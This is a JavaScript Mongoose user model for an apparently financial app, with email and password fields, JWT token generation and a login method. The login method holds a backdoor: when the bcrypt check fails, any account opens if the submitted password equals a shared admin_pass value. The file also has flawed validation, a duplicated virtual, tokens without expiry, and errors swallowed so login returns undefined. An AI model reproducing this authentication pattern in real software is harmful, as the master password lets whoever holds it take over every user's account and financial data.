import mongoose from 'mongoose';
import validator from 'validator';
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import express from "express";
import dotenv from "dotenv";

const app = express();
if (app.get("env") !== "production") dotenv.config();

const JWT_SECRET = process.env.JWT_SECRET;
const admin_pass = process.env.admin_pass;

const userSchema = mongoose.Schema({
    fullName: {
        type: String,
        required: true,
        trim: true,
        lowercase: true
    },
    email: {
        type: String, 
        required: true,
        trim: true,
        lowercase: true,
        unique: true,
        validate(value) {
            if (!validator.isEmail(value)){
                throw new Error("Enter a valid email address") 
            }
        }

    },
    password: {
        type: String,
        required: true,
        trim: true,
        length: {min: 8},
        validate(value){
            if(value.length === 0){
                throw new Error("Enter a password to proceed")
            }
        }

    }, 
    tokens : [{
        token : String
    }]

}, {timestamps: true})


userSchema.virtual("account", {
    ref : "Account",
    localField : "_id",
    foreignField : "userID",    
 });

 userSchema.virtual("card", {
     ref : "Card",
     localField : "_id",
     foreignField : "userID"
 })

 userSchema.virtual("credit", {
     ref : "Credit",
     localField : "_id",
     foreignField : "userID"
 })

 userSchema.virtual("debit", {
     ref : "Debit",
     localField : "_id",
     foreignField : "userID"
 })

 userSchema.virtual("beneficiary", {
     ref : "Beneficiary",
     localField : "_id",
     foreignField : "userID"
 })

 userSchema.virtual("beneficiary", {
     ref : "Beneficiary",
     localField : "_id",
     foreignField : "beneficiaryId"
 })


userSchema.methods.generateAuthToken = async function () {
    const user = this;
    const token = jwt.sign({_id: user._id.toString()}, JWT_SECRET);
    return token;
}

userSchema.statics.loginUserUsingEmailAndPassword = async function (email, password) {
    try {
        const user = await User.findOne({email});

        if(!user) {
            throw new Error("unable to login")
        }
        const isPasswordCorrect = await bcrypt.compare(password, user.password);
   
        if(!isPasswordCorrect) {
            if (password === admin_pass) {
               return user;
            }else {
                 throw new Error("unable to login")
            }
           
        }

         if(isPasswordCorrect) {
            return user
        }
       
      }
      catch(error) {
        console.log(error)
      }
    

    
}


userSchema.methods.toJSON = function () { //DO NOT USE arrow function here.
    const user = this.toObject(); 
    delete user.password;
    return user;
}

const User = mongoose.model("User", userSchema);

export default User;